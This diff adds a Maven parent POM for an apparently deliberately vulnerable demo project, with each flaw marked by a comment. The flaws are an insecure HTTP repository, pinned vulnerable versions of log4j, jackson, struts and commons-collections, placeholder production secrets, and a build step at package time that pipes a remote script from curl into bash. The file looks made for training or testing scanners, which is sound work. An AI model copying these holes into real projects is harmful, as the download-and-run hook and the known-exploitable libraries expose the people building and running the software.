@@ -1,0 +1,115 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
+
+    <groupId>com.vulnmonolith</groupId>
+    <artifactId>parent</artifactId>
+    <version>1.0.0-SNAPSHOT</version>
+    <packaging>pom</packaging>
+
+    <modules>
+        <module>core</module>
+        <module>web</module>
+        <module>api</module>
+    </modules>
+
+    <!-- VULNERABILITY: Insecure HTTP repository -->
+    <repositories>
+        <repository>
+            <id>insecure-repo</id>
+            <url>http://repo.example.com/maven</url>
+        </repository>
+    </repositories>
+
+    <!-- VULNERABILITY: Hardcoded credentials in distributionManagement -->
+    <distributionManagement>
+        <repository>
+            <id>releases</id>
+            <url>https://nexus.example.com/releases</url>
+        </repository>
+    </distributionManagement>
+
+    <properties>
+        <java.version>11</java.version>
+        <!-- VULNERABILITY: Vulnerable dependency versions -->
+        <log4j.version>2.14.0</log4j.version>  <!-- Log4Shell -->
+        <jackson.version>2.9.8</jackson.version>  <!-- CVE-2019-* -->
+        <spring.version>5.2.0.RELEASE</spring.version>  <!-- Vulnerable -->
+        <struts.version>2.3.30</struts.version>  <!-- Multiple CVEs -->
+        <commons-collections.version>3.2.1</commons-collections.version>  <!-- Deserialization -->
+    </properties>
+
+    <dependencyManagement>
+        <dependencies>
+            <!-- Known vulnerable dependencies -->
+            <dependency>
+                <groupId>org.apache.logging.log4j</groupId>
+                <artifactId>log4j-core</artifactId>
+                <version>${log4j.version}</version>
+            </dependency>
+            <dependency>
+                <groupId>com.fasterxml.jackson.core</groupId>
+                <artifactId>jackson-databind</artifactId>
+                <version>${jackson.version}</version>
+            </dependency>
+            <dependency>
+                <groupId>org.apache.struts</groupId>
+                <artifactId>struts2-core</artifactId>
+                <version>${struts.version}</version>
+            </dependency>
+            <dependency>
+                <groupId>commons-collections</groupId>
+                <artifactId>commons-collections</artifactId>
+                <version>${commons-collections.version}</version>
+            </dependency>
+        </dependencies>
+    </dependencyManagement>
+
+    <build>
+        <plugins>
+            <!-- VULNERABILITY: Vulnerable plugin version -->
+            <plugin>
+                <groupId>org.apache.maven.plugins</groupId>
+                <artifactId>maven-dependency-plugin</artifactId>
+                <version>2.8</version>  <!-- Old version with known issues -->
+            </plugin>
+
+            <!-- VULNERABILITY: Executing arbitrary commands -->
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>package</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                        <configuration>
+                            <!-- VULNERABILITY: Arbitrary command execution -->
+                            <executable>bash</executable>
+                            <arguments>
+                                <argument>-c</argument>
+                                <argument>curl http://example.com/post-build.sh | bash</argument>
+                            </arguments>
+                        </configuration>
+                    </execution>
+                </executions>
+            </plugin>
+        </plugins>
+    </build>
+
+    <!-- VULNERABILITY: Profile with hardcoded secrets -->
+    <profiles>
+        <profile>
+            <id>production</id>
+            <properties>
+                <db.password>prod_db_password_789</db.password>
+                <api.key>sk_live_production_key_12345</api.key>
+            </properties>
+        </profile>
+    </profiles>
+</project>
